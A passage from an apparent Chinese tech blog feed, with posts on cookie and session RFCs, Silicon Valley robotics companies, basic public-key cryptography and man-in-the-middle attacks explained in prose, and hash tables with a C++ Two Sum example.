第八步：伺服器 -&gt; 瀏覽器HTTP/1.1 200 OK

根據瀏覽器帶上來的 Cookie 得知用戶資料、購買品項以及運送方式，交易完成！
上面這個範例大致說明了 Cookie 的運作方式，就是透過伺服器傳送 Set-Cookie 這個 header 來設置資訊，並且靠瀏覽器傳送 Cookie header 把之前儲存的資訊一併帶上來，這樣子就有了狀態，就開啟了一段 Session。
接著來看第六部分：IMPLEMENTATION CONSIDERATIONS，講到實作上的一些考量，這邊一樣截取片段：

6.1  Set-Cookie Content
The session information can obviously be clear or encoded text that describes state.  However, if it grows too large, it can become unwieldy.  Therefore, an implementor might choose for the session information to be a key to a server-side resource.  Of course, using a database creates some problems that this state management specification was meant to avoid, namely:

keeping real state on the server side;
how and when to garbage-collect the database entry, in case the user agent terminates the session by, for example, exiting.

存在 cookie 裡的 session 資訊可以是明文或是編碼過後的文字，但如果存的東西太多會變得太笨重。所以，你可以選擇只在 session 資訊裡放一個對應到伺服器資源的 key。但這種方式會造成一些這個狀態管理機制本來就想避免掉的一些問題，主要是：

把狀態放在 server
如何以及何時把沒有用的狀態資訊清掉


其實這種方式就是我們在上一篇所提到的兩個不同的方法：Cookie-based session 以及 SessionID，前者的缺點就是存太多東西會變得笨重，後者則是需要把狀態放在 Server。
兩種方式其實各有優劣，但比較常使用的還是 SessionID 那種方式，也就是原文提到的：「session information to be a key to a server-side resource」。
好，其他都是有關安全性或是跟隱私有關的部分，跟我們這篇要談的議題有點差異，因此我就不特別提了。
讓我們先來整理一下上面所看到的東西。
首先，Cookie 就是為了要建立 Session 而生的，因為在這之前要建立 Session 只能透過我上一篇提到的那些方式，例如說用網址列帶資訊，或者是在 form 裡面放一個 hidden 的欄位。為了簡化這些行為才有了 Cookie。
而實際方式就是 Server 回傳 Set-Cookie 的 header，User agent 把這些資訊儲存起來之後，在後續的 Request 都加上一個 Cookie header，這就是我們上一篇中所提到的「紙條」，每次都會帶著這個紙條，就讓 Request 之間有了狀態。
至於要在 Cookie 裡放什麼狀態都行，但如果放的東西太多可以考慮把這些狀態移到 Server 去，只在 Cookie 裡放一個可以對應的 ID。這就是我們之前所說的 Session ID 與 Session Data。
RFC 2965RFC 2965 誕生於 2000 年，不過它的內容跟 RFC 2109 其實相去不遠，大概有八成的內容都是一樣的。
為什麼呢？
在 RFC 2109 出來之後不久他們發現了 IE3 與 Netscape Navigator3 對於這份「新的」Cookie 標準（舊的指的是 Netscape 原本自己的那套規範）實作不同，例如說底下這一段：
Set-cookie: xx=&quot;1=2\&amp;3-4&quot;;Comment=&quot;blah&quot;;Version=1; Max-Age=15552000; Path=/;Expires=Sun, 27 Apr 1997 01:16:23 GMT

在 IE 裡面會把 Cookie 設置成這樣：Cookie: Max-Age=15552000，在 Netscape Navigator 裡面則是我們預期的：Cookie: xx=&quot;1=2\&amp;3-4&quot;.，同一段 Header 卻產生了不同的結果，於是他們就要想辦法來修正這個行為。
最後就有了 RFC 2965 的出現，解決方式是引入了兩個新的 Header：Cookie2 跟 Set-Cookie2，其餘部分都與 RFC 2109 差不多。
因此 2965 我們可以跳過不看，直接來看最新的 RFC 6265。
RFC 6265RFC 6265 是 2011 年出現的文件，跟上一份相隔 11 年。
而這份文件可以說是把 Cookie 規則再翻新了一遍，修改的幅度很大，在 Introduction 裡面就有說明了：

Prior to this document, there were at least three descriptions of cookies: the so-called “Netscape cookie specification” [Netscape], RFC 2109 [RFC2109], and RFC 2965 [RFC2965].  However, none of these documents describe how the Cookie and Set-Cookie headers are actually used on the Internet (see [Kri2001] for historical context).
在這份文件之前，至少存在著三份不同的 Cookie 規格，第一個是 Netscape 的規格，再來是 RFC 2109 以及 2965。可是沒有一份文件真的在描述現今我們如何使用 Cookie 與 Set-Cookie。

有些我們現在在用的屬性，在 RFC 2965 都是不存在的，例如說 HttpOnly。這份規範把很多東西都定義的比較明確，有興趣的讀者可以自己去看。
接著我們來看一些有趣的地方好了，第一個是 3.1 Examples，裡面提到的範例直接使用了 SessionID：

3.1.  Examples
Using the Set-Cookie header, a server can send the user agent a short string in an HTTP response that the user agent will return in future HTTP requests that are within the scope of the cookie.  For example, the server can send the user agent a “session identifier” named SID with the value 31d4d96e407aad42.  The user agent then returns the session identifier in subsequent requests.
伺服器可以利用 Set-Cookie header 設置一個簡短的字串，而瀏覽器會在後續的 Request 把這個字串傳上來。舉例來說，伺服器可以傳送一個「session identifier」稱之為 SID，內容是 31d4d96e407aad42，而瀏覽器就會在之後的 Request 把這個 sessionID 傳上來。

底下還有提供更完整的範例，但有點長我就不翻了。其實我很推薦大家自己把這整份文件都看完，因為這整份文件定義的就是現在我們在使用的 Cookie 規格（基本上是啦，雖然還是有一點出入），你可以從規格裡面知道最正確的資訊。
例如說：

4.1.2.5.  The Secure Attribute
The Secure attribute limits the scope of the cookie to “secure” channels (where “secure” is defined by the user agent).  When a cookie has the Secure attribute, the user agent will include the cookie in an HTTP request only if the request is transmitted over a secure channel (typically HTTP over Transport Layer Security (TLS)[RFC2818]).
Secure 這個屬性限制了 Cookie 只能在「安全」的管道上傳輸（安全的定義由 user agent 自己定義）。當一個 Cookie 有了 Secure 這個屬性，只有當 Request 在安全的管道（通常指的是 TLS）中傳輸時才會把 cookie 放進 HTTP Request 裡面。

這邊我們就可以看到規格與實作的差異。規格只說了「什麼是安全由 user agent 自己定義」，而沒有強制規範說「一定要在 HTTPS 的時候才能傳輸」。所以一般我們所認知的「Secure 就是代表一定要 HTTPS 才會被傳送」其實指的是主流瀏覽器的實作，而不是 RFC 的規範。
所以如果想完整回答「設置 Secure 屬性代表什麼」這個問題，可以這樣回答：

代表這個 Cookie 只能透過 secure 的管道被傳輸，至於什麼是 secure，RFC 上寫說由瀏覽器自行定義。依據目前主流的實作，就是指只能透過 HTTPS 來傳送

再來我們來看跟我們切身相關的一個東西：

7.Privacy Considerations
Cookies are often criticized for letting servers track users.  For example, a number of “web analytics” companies use cookies to recognize when a user returns to a web site or visits another web site.  Although cookies are not the only mechanism servers can use to track users across HTTP requests, cookies facilitate tracking because they are persistent across user agent sessions and can be shared between hosts.
Cookie 因為可以被用來追蹤使用者而飽受批評。舉例來說，很多在做 web analytics 的公司用 cookie 來辨認用戶造訪了哪些網站。雖然 cookie 不是唯一能追蹤使用者的技術，但因為它可以在不同 host 被共享的特性，的確促進了這種追蹤的行為。
7.1. Third-Party Cookies
Particularly worrisome are so-called “third-party” cookies.  In rendering an HTML document, a user agent often requests resources from other servers (such as advertising networks).  These third-party servers can use cookies to track the user even if the user never visits the server directly.  For example, if a user visits a site that contains content from a third party and then later visits another site that contains content from the same third party, the third party can track the user between the two sites.
最令人擔心的就是第三方 cookie。在渲染 HTML 頁面時，瀏覽器常會發送一些 Request 去其他的 Server（例如說廣告商的伺服器），所以儘管這些使用者從來沒有直接造訪這些網站，這些網站可以利用 Cookie 來追蹤使用者。舉例來說，使用者造訪了有跟某廣告商合作的 A 網站，然後又去了跟同個廣告商有合作的 B 網站，廣告商就可以在這兩個網站之間追蹤使用者。
Some user agents restrict how third-party cookies behave.  For example, some of these user agents refuse to send the Cookie header in third-party requests.  Others refuse to process the Set-Cookie header in responses to third-party requests.  User agents vary widely in their third-party cookie policies.  This document grants user agents wide latitude to experiment with third-party cookie policies that balance the privacy and compatibility needs of their users. However, this document does not endorse any particular third-party cookie policy.
有些瀏覽器會限制第三方 Cookie。舉例來說，有些不發送 Cookie header 給第三方，有些則是不處理第三方的 Set-Cookie header。每一個瀏覽器對於第三方 cookie 的處理方式都不太一樣，而這份文件給了瀏覽器很大的空間去實驗什麼是對使用者最好的策略，試圖在隱私與兼容性之間取得一個平衡。然而，這份文件不會認可任何一個特定的第三方 cookie 處理方式。
Third-party cookie blocking policies are often ineffective at achieving their privacy goals if servers attempt to work around their restrictions to track users.  In particular, two collaborating servers can often track users without using cookies at all by injecting identifying information into dynamic URLs.
如果 Server 用一些 workaround 追蹤使用者的話，阻擋第三方 cookie 的策略其實不是那麼有用。例如說他們可以把資訊附加在 URL 上面來追蹤用戶，而不透過 Cookie。

其實當初在 RFC 2109 就有談論過第三方 cookie 的議題，只是那時候叫做 Unverifiable Transactions，看到的時候我有嚇了一跳，在 1997 年剛有 cookie 的時候就已經提到了第三方 cookie 的問題。
畢竟這個問題感覺在近期才比較被廣泛討論，而且在近幾年 Safari 跟 Firefox 才預設阻擋第三方 cookie。甚至連 Facebook 之後的解法 dynamic URLs 都早已出現在 RFC 6265 上面（我超討厭那串 fbcid…）。
最後我們來看一些跟安全性相關的東西，都在 8.Security Considerations 裡面：

8.4. Session Identifiers
Instead of storing session information directly in a cookie (where it might be exposed to or replayed by an attacker), servers commonly store a nonce (or “session identifier”) in a cookie.  When the server receives an HTTP request with a nonce, the server can look up state information associated with the cookie using the nonce as a key.
比起把 session 資訊直接存在 cookie 裡面，server 通常只在 cookie 裡面存一個 sessionID，當 server 收到這個 sessionID 的時候就能夠找到相對應的資料。
Using session identifier cookies limits the damage an attacker can cause if the attacker learns the contents of a cookie because the nonce is useful only for interacting with the server (unlike non- nonce cookie content, which might itself be sensitive).  Furthermore, using a single nonce prevents an attacker from “splicing” together cookie content from two interactions with the server, which could cause the server to behave unexpectedly.
跟直接把敏感資訊存在 cookie 比起來，只存 sessionID 能夠侷限攻擊者所能造成的傷害，因為就算攻擊者知道裡面存了 sessionID 也沒什麼用。（splicing 那段看得不是很懂）
Using session identifiers is not without risk.  For example, the server SHOULD take care to avoid “session fixation” vulnerabilities. A session fixation attack proceeds in three steps.  First, the attacker transplants a session identifier from his or her user agent to the victim’s user agent.  Second, the victim uses that session identifier to interact with the server, possibly imbuing the session identifier with the user’s credentials or confidential information. Third, the attacker uses the session identifier to interact with server directly, possibly obtaining the user’s authority or confidential information.
使用 sessionID 也不是完全沒有風險。舉例來說，server 應該要避免 session fixation 這種攻擊方法。這種攻擊方法有三個步驟，第一個步驟是先產生一個 sessionID，並且把這 ID 傳給受害者；第二步是受害者用這個 sessionID 來登入；在受害者登入以後，攻擊者就能夠使用同樣的 sessionID 取得受害者的資料。

原文對固定 Session（Session fixation）的說明沒有很清楚，有興趣的朋友可以參考 HTTP Session 攻擊與防護，這篇講得比較清楚一點。
簡單來說就是讓受害者用你指定的 sessionID 登入，所以在 Server 端這個 sessionID 就會跟受害者的帳號綁在一起。接著你再用同樣的 sessionID，就可以用受害者的身份登入並且使用網站。
接著我們再來看另外一個安全性問題：

8.6. Weak Integrity
Cookies do not provide integrity guarantees for sibling domains (and their subdomains).  For example, consider foo.example.com and bar.example.com.  The foo.example.com server can set a cookie with a Domain attribute of “example.com” (possibly overwriting an existing “example.com” cookie set by bar.example.com), and the user agent will include that cookie in HTTP requests to bar.example.com.  In the worst case, bar.example.com will be unable to distinguish this cookie from a cookie it set itself.  The foo.example.com server might be able to leverage this ability to mount an attack against bar.example.com.
Cookies 對 subdomain 並不具有完整性。舉例來說，foo.example.com 可以對 example.com 設置 cookie，而這個有可能把 bar.example.com 對 example.com 設置的 cookie 給蓋掉。最糟的情況下，當 bar.example.com 收到這個 cookie 時，區分不出是自己設置的還是別人設置的。foo.example.com 就可以利用這個特性來攻擊 bar.example.com。
An active network attacker can also inject cookies into the Cookie header sent to https://example.com/ by impersonating a response from http://example.com/ and injecting a Set-Cookie header.  The HTTPS server at example.com will be unable to distinguish these cookies from cookies that it set itself in an HTTPS response.  An active network attacker might be able to leverage this ability to mount an attack against example.com even if example.com uses HTTPS exclusively.
攻擊還可以利用 http://example.com/ 來把 https://example.com/（前者是 http，後者 https）的 cookie 蓋掉，server 就無法分辨這個 cookie 是 http 還是 https 設置的。攻擊者一樣可以利用這個特性來進行攻擊。

上面這一段在 4.1.2.5 The Secure Attribute 其實也有提到：

Although seemingly useful for protecting cookies from active network attackers, the Secure attribute protects only the cookie’s confidentiality. An active network attacker can overwrite Secure cookies from an insecure channel, disrupting their integrity

大意就是說 Secure 屬性沒辦法保障 cookie 的完整性。攻擊者可以從 HTTP 覆蓋掉 HTTPS 的 cookie。
看到這邊的時候我心頭一驚，這個不就是在講我之前寫過的：我遇過的最難的 Cookie 問題嗎？現在我也終於知道為什麼 Safari 跟 Firefox 都沒有擋這種行為，因為在規格裡面並沒有要求你一定要擋。
至於 Chrome 的話，它的實作參考了幾個不同的 RFC，在負責管理 Cookie 的 CookieMonster 裡面有寫到：

CookieMonster requirements are, in theory, specified by various RFCs. RFC 6265 is currently controlling, and supersedes RFC 2965.
 However, most browsers do not actually follow those RFCs, and Chromium has compatibility with existing browsers as a higher priority than RFC compliance.
An RFC that more closely describes how browsers normally handles cookies is being considered by the RFC; it is available at http://tools.ietf.org/html/draft-ietf-httpstate-cookie.  The various RFCs should be examined to understand basic cookie behavior; this document will only describe variations from the RFCs.

在 CookieMonster.cc 裡面也有寫到：

If the cookie is being set from an insecure scheme, then if a cookie already exists with the same name and it is Secure, then the cookie should not be updated if they domain-match and ignoring the path attribute.
See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone

文中所提到的文件還在草稿階段，標題是：「Deprecate modification of ‘secure’ cookies from non-secure origins」，是由 Google 的員工所發起的草稿。在 Introduction 的地方寫的很明確了：

Section 8.5 and Section 8.6 of [RFC6265] spell out some of the drawbacks of cookies’ implementation: due to historical accident, non-secure origins can set cookies which will be delivered to secure origins in a manner indistinguishable from cookies set by that origin itself.  This enables a number of attacks, which have been recently spelled out in some detail in [COOKIE-INTEGRITY].


We can mitigate the risk of these attacks by making it more difficult for non-secure origins to influence the state of secure origins. Accordingly, this document recommends the deprecation and removal of non-secure origins’ ability to write cookies with a ‘secure’ flag, and their ability to overwrite cookies whose ‘secure’ flag is set.

大意就是說跟我們剛剛在 RFC 6265 的 Section 8.5 與 8.6 看到的一樣，由於一些歷史因素，secure 的 cookie 可以被 non-secure 的來源蓋掉。而這份文件就是要試著阻止這種行為。
看到這邊，與 Session 跟 Cookie 相關的文件差不多都讀完了，讓我們做個簡單的總結。
總結回到最開始的問題：到底 Session 是什麼？
從 RFC 裡面提到的各種 Session 相關的字眼，我會認為 Session 就是它英文的原意之一，代表著：「具有狀態的一段期間」或者是「上下文」，所以你想要開啟或是建立一個 Session，必要條件就是先有一個機制來建立及保留狀態。
這也是為什麼 Cookie 的 RFC 標題為：HTTP State Management Mechanism，狀態管理機制。在 Cookie 還沒出現以前，一樣可以建立 Session，可以把狀態資訊放在網址列上面或是藏在 form 表單中。但 Cookie 出現以後建立 Session 變成一件更容易的事，只要使用 Set-Cookie 與 Cookie 這兩個 header 就好了。
建立 Session 之後，所儲存的狀態就叫做 Session information，可以翻作 Session 資訊。若是選擇把這些資訊存在 Cookie 裡面，就叫做 Cookie-based session；還有另一種方法則是在 Cookie 裡面只存一個 SessionID，其他的 Session 資訊都存在 Server 端，靠著這個 ID 把兩者關聯起來。
除了 Session 以外，我們也在 RFC 裡面看見一些有趣的東西，例如說第三方 Cookie 的隱私疑慮以及與 Cookie 相關的安全性問題，這些都能加深你對於 Cookie 的理解。
在結束以前，我誠心推薦一篇文章：HTTP Cookies: Standards, Privacy, and Politics，網頁右邊可以下載 PDF 來看。這篇文章的作者就是 RFC 2109 與 2965 的作者。文章裡面把 Cookie 出現的歷史以及當初發生的事講的一清二楚，強烈建議大家都可以花點時間來看這篇文章，可以深入地理解 Cookie 與 Session 早期的歷史。
最後，別忘了這是系列文的第二篇，下一篇我們會來看一些主流框架如何處理 Session。
三篇的完整連結如下：

白話 Session 與 Cookie：從經營雜貨店開始
淺談 Session 與 Cookie：一起來讀 RFC
深入 Session 與 Cookie：Express、PHP 與 Rails 的實作

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>web</tag>
        <tag>cookie</tag>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title>矽谷機器人公司一覽 &amp; 相關資源</title>
    <url>/2019/06/08/silicon-valley-robotics-company/</url>
    <content><![CDATA[前言今天想要整理一些灣區機器人公司的相關資訊，希望對之後有興趣到矽谷做機器人的朋友有幫助。另外除了公司列表之外，也會順便提供一些其他的資源(比如相關組織，或是可以搜尋職位的網站)。
公司列表與介紹自動駕駛
Zoox @ Foster City

Cruise Automation @ San Francisco

Embark @ San Francisco
 Embark 是做 Self-driving truck 的公司，這一塊的市場很大，而且大部分的路途都是在車流較單純的公路上，個人覺得滿有潛力的。

pony.ai @ Fremont

lvl5 @ San Francisco
 這間公司主要是提供很好的 Map，讓想要做自動駕駛的公司有很好的地圖可以用，也很有趣。

Starsky Robotics @ San Francisco
 這間公司也是做 Self-driving truck。

DeepMap @ Palo Alto

Drive.ai @ San Carlos


現在自動駕駛很熱門，還有很多公司就不列進來了，如果大家有興趣，可以從下面的一些搜尋職缺資源去找。
服務型機器人
savioke @ San Jose
 他們的機器人主要應用在醫院，旅館等等地方，用來遞送東西。

Chowbotics @ Hayward
 這間公司是做可以自己做食物的機器人。


工業&#x2F;農業自動化
Fetch Robotics @ San Jose
 由 Willow Garage 的團隊 spin off 出來的 Fetch Robotics 是主力放在物流自動化的一間公司，他們的機器人也是目前許多大學會用來做研究的平台，憑藉著強大的技術實力，是一間很不錯的公司。

Blue River Technology @ Sunnyvale
 這間公司是農業自動化業界滿有名的公司，總部在 Sunnyvale。


其他相關資源組織
Silicon Valley Robotics
  這個組織提供了不錯的整合資源，他們會定期舉辦一些活動，有提供部落格，也有定期的 Newsletter 可以關注。


文章或討論串
What are all the robotics companies in Silicon Valley?
The Top 14 Successful Robotics Startups Last Year

職缺
Robots.Jobs
Robotics Startups on AngelList
Robotics Jobs in San Francisco Bay Area

Tour
Visit Innovative Robotics Companies in Silicon Valley

總結今天跟大家介紹了一些矽谷的機器人公司，也整理了一些尋找職缺或更深入跟灣區機器人社群連結的資源，希望未來對大家會有幫助！
延伸閱讀
Self Driving Car Startups to Watch
Looking towards service robotics in 2017

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Robotics company, Silicon Valley, Job</tag>
      </tags>
  </entry>
  <entry>
    <title>網路安全(1) - 基礎密碼學</title>
    <url>/2017/04/16/simple-cryptography/</url>
    <content><![CDATA[基礎密碼學密碼學裡面有兩種加解密方式，一種是對稱性加密，一種是非對稱性加密。差別很簡單，對稱性加密，意思就是我加密跟解密用的是同一個鑰匙，所以只要 A 跟 B 都知道這把鑰匙，A 要傳給 B 的時候，就用這個鑰匙加密。B 拿到了之後再用同一個鑰匙解密，你們兩就可以互通有無，暗通款曲。即使有中間人攔截了你們的傳輸，只要他沒有你們的鑰匙，他就不知道你們在幹麻。
那 bug 是什麼呢？阿哈！那你們要偷來暗去之前，總是需要傳第一次告訴對方你們的鑰匙吧？要是第一次就被中間人攔截，你們不就沒戲了嗎？他攔截到偷偷記下來後再原封不動傳給接受方，那之後的所有攔截到的加密後的訊息，他都有你們共有的鑰匙可以解密了。那該怎麼辦呢？
非對稱式加密英雄登場
非對稱式加密，就是每個鑰匙 pair 有兩個鑰匙，一個公鑰一個私鑰。
可以公鑰加密私鑰解密，也可以私鑰加密公鑰解密。
可以公鑰加密私鑰解密，也可以私鑰加密公鑰解密。
可以公鑰加密私鑰解密，也可以私鑰加密公鑰解密。
很重要所以說三次。
傳訊之前呢，A 跟 B 都先生成一組公私鑰的 pair，A 把 A 的公鑰傳給 B，B 把 B 的公鑰傳給 A。
好現在 A 有他自己的私鑰跟 B 的公鑰，B 有他自己的私鑰跟 A 的公鑰。A 要傳東西給 B 就用 B 的公鑰加密，然後 B 拿到之後用 B 自己的私鑰解密。一切搞定，即使在中途被攔截，只要 B 的私鑰沒有流出就完全不會有事。反之亦然。
中心思想就是利用公鑰可以用來加密的特性，而如果你是用公鑰加密你必須要用私鑰解密。所以我根本不怕公鑰流出(公開給所有人也沒差)，只要我私鑰保存好就好，我私鑰根本就沒傳過，也不可能被攔截。
那為什麼這解決了對稱性加密的問題呢？因為第一次的傳輸也只互傳公鑰，所以即使公鑰被攔截，之後中間人拿到加密過的訊息也不能怎麼樣，因為那個要對方的私鑰才能解，所以一切都非常的美好…

這裡是個伏筆，等等會回來。第一次有伏筆會先自己說自己是伏筆，看到這裡你就知道這篇文章絕不簡單，非比尋常。
數位簽章故事繼續，那既然大家都有 B 的 public key ，那任何人都可以用 B 的公鑰加密傳訊息給 B，那 B 怎麼知道哪個是 A 寫的哪個是別人偽造的呢？這裡就要引進數位簽章的概念。
但說破哪值幾文錢？數位簽章就是 A 在傳送訊息前，用 A 的私鑰加密，傳給 B。B 再用 A 的公鑰來看是不是真的是 A 簽名的(事實上是對內容的 Hash 簽名，不過為了講解方便，就先當直接對內容簽)。
這裡運用的是可以公鑰加密私鑰解密，也可以私鑰加密公鑰解密的第二個特性。
你說公鑰所有人都有怎麼辦？反正全世界都知道這訊息是A的訊息也沒關係，只要沒有 B 的私鑰就沒有其他人可以看到內容！
融會貫通驗收成果的時間來了。所以今天 A 要傳訊息給 B 要怎麼樣讓這訊息只有 B 看得到，而且 B 也確定是 A 寫的不是別人寫的呢？
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
一開始 A 先把 A 的公鑰傳給 B，B 先把 B 的公鑰傳給 A。
A 要傳給 B 之前，把要傳的內容，先用 B 的公鑰加密再用 A 的私鑰簽，然後 B 用 A 的公鑰確認簽章再用 B 的私鑰解密內容。
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
簡單吧！恭喜你已經比大多數人基礎都好了。
說好的伏筆呢如果今天出現了一個神級的中間人，還是有辦法破解，怎麼破呢？

在一開始 A 要傳送 A 的公鑰給 B 的時候，要是被 C 攔截，C 就可以爽拿 A 的公鑰。然後呢？自己再生個公私鑰 pair，把 C 的公鑰 1 給 B，跟他說這是 A 的公鑰。
在一開始 B 要傳送 B 的公鑰給 A 的時候，要是被 C 攔截，C 就可以爽拿 B 的公鑰。然後呢？自己再生另一個公私鑰 pair，把 C 的公鑰 2 給 A，跟他說這是 B 的公鑰。
A 和 B 以為拿著對方的公鑰。
今天 A 要傳給 B，他以為他用 B 的公鑰加密(事實上他用了公鑰 C2)，再用 A 的私鑰簽，想傳送給 B 但被 C 攔截。
C 用 A 的公鑰驗證，用私鑰 C2 解密之後，爽看內容，然後他想怎麼改寫就怎麼改寫。
改寫完後，用 B 的公鑰加密後再用私鑰 C1 簽章。
B 拿到後，他用 A 的公鑰確認(事實上這是公鑰 C1)然後再用他自己的私鑰解密。
一切神不知鬼不覺。


破解中間人攻擊要怎麼避免神級中間人的攻擊，其實非對稱式協議唯一的 bug 就是一開始公鑰交換的時候可以動手腳，所以解法就是只要在互傳公鑰的時候，有一個可信的第三方可以證明說一開始你拿到的公鑰是真的就可以。
就是 A 跟 B 要傳訊息之前互傳公鑰的這個步驟，A 拿到 B 的公鑰之後，去一個有公信力的人那邊問一下，嘿！這個真的是 B 的公鑰嗎？他說是你就可以信，他說不是那就可能被中間人攻擊，就這麼簡單。
恭喜你已經精通了中間人攻擊，對網路安全其他主題有興趣的讀者請到延伸閱讀收看續集。
延伸閱讀
網路安全(2) - HTTPS
網路安全(3) - SSH
用什麼樣的密碼比較安全呢

關於作者：@jyt0532 後端工程師，喜歡學習新知挑戰新事物，最近覺得 Anti pattern 比 Design pattern 有趣。
]]></content>
      <tags>
        <tag>security cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>白話的 Hash Table 簡介</title>
    <url>/2017/01/21/simple-hash-table-intro/</url>
    <content><![CDATA[前言最近因緣際會，複習了一些基礎的資料結構。在看到 Hash Table 的時候，也順便看了一下他的時間複雜度。不看還好，一看不得了，怎麼那麼小 (插入元素、移除元素跟找某個元素大概都只要 O(1) 的時間複雜度)！所以想要用很簡潔白話的方式說明一下 Hash Table 這個好用的資料結構。
簡介 Hash TableHash Table 是儲存 (key, value) 這種 mapping 關係的一種資料結構，從圖中可以很清楚地看到

那為什麼他的時間複雜度這麼低呢? 舉例來說，如果我們有 n 個數字要儲存，一般大家常會用 array 來存。如果我們拿到另一個數字 A，要判斷這個數字 A 有沒有在 array 裡面，那我們勢必得跟 array 裡的元素一個個比較，時間複雜度是 O(n)。(先做過 sorting 的話，就可以用二分搜尋法比較快地找到，但還是需要 O(logn) 的時間複雜度)
但因為 hash function 的關係，如果先把 n 個數字儲存在 Hash Table 裡面，那如果要判斷這個數字 A 是不是已經被存在 Hash Table 裡面，只要先把這個數字丟進 hash function，就可以直接知道 A 對應到 Hash Table 中哪一格。所以其實是 hash function 幫我們省去了一個個比較的力氣。 
如果想看 Hash Table 詳細的介紹跟實作，可以參考 @kdchang 之前寫過的用 JavaScript 學習資料結構和演算法：字典（Dictionary）和雜湊表（Hash Table）篇。
Hash Table 的秘密醬汁 - Hash FunctionHash Table 好不好用的關鍵跟這個神奇的 hash function 有很大的關係。讓我們想像一種情況，如果我們使用一個壞掉的 hash function，不管餵給這個 hash function 什麼內容他都會吐出同一個 index，那這樣的話就跟存一個 array 沒什麼兩樣。 搜尋的時間複雜度就會變成 O(n)。
以實用的角度出發，在簡單認識 Hash Table 的時候並不需要理解 hash function 要怎麼實作，但是我們要知道，hash function沒有完美的，有可能會把兩個不同的 key 指到同一個桶子，這就是所謂的 collision。當 collision 發生的時候，除了最直觀地增加 Hash Table 的桶子數，在每個桶子中用一個 linked list 來儲存 value、或是 linear probe 都是常用的方法，不過我們就先不細究下去。
Hash Table 有沒有什麼不好用的地方最簡單的答案是，不該使用 Hash Table 的時候。例如想要處理一些有時間順序的 data，希望可以丟掉最先進來的資料優先，queue 顯然就是一個更好的選擇。
還有一個情況是，如果希望儲存的 data 可以被排序，那 Hash Table 就會不太好用。有個不錯的討論串在討論這個問題。
Hash Table 的應用Hash Table 的一個簡單應用就是搜尋引擎(之前在 Udacity 上過一門課，裡面就會教大家怎麼用 Hash Table 的概念來做搜尋引擎的後台)，例如在搜尋的時候輸入關鍵字，我們可以把這個關鍵字傳進 hash function，然後 hash function 就可以指出這個關鍵字對應到的桶子，這時候再到這個桶子裡搜尋網頁就可以了。
當然，如果你在某些時刻只能使用時間複雜度是 O(1) 的演算法來存取元素，那 Hash Table 絕對是你的好朋友。
用 Hash Table 來解一題簡單的演算法題目我們先看個題目 - Two Sum，假設我們有一個 array，裡面儲存了一些數字，假設我有一個想要找到的數字 target，請找出 array 中兩個數字的 index，這兩個數字的和必須跟 target 一樣。
假設有 nums = [2, 7, 11, 15], target = 9，因為 nums[0] + nums[1] = 2 + 7 = 9，回傳 [0, 1]。

最直觀的作法是用兩層 for 迴圈，跑過所有可能的組合就可以了，但如果我們被要求只能用 O(n) 複雜度的演算法解出這題要怎麼辦呢。
一個方法就是用 Hash Table，做法是，當迴圈跑到nums[i]時，如果 target-nums[i]還不在 Hash Table中，那就儲存(nums[i], i)，從題目的範例看一下:
nums = [2, 7, 11, 15]target = 9

我們希望得到的答案是 0 跟 1 。 如果我在跑到 2 的時候就先儲存 (2, 0)，這樣我在迴圈跑到 7 的時候，就會發現 9-7 已經在 Hash Table 裡，然後就可以取得 2 的 index(0)了。這樣演算法就會是 O(n) 的時間複雜度囉！
class Solution &#123;public:    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123;        vector&lt;int&gt; ans;        map&lt;int, int&gt; indexMap;        map&lt;int, int&gt;::iterator iter;        for(int i=0; i&lt;nums.size(); i++)        &#123;            iter = indexMap.find(target-nums[i]);            if(iter != indexMap.end())            &#123;                ans.push_back(iter-&gt;second);                ans.push_back(i);                return ans;            &#125;            else                 indexMap.insert(pair&lt;int, int&gt;(nums[i], i));        &#125;        return ans;    &#125;&#125;;

（image via Vishesh Handa’s blog)
關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>Data Structure, Hash Table</tag>
      </tags>
  </entry>
  <entry>
    <title>給工程師的 Sketch Prototyping 簡易入門教學</title>
    <url>/2016/06/04/sketch-prototyping-for-engineer/</url>
    <content><![CDATA[
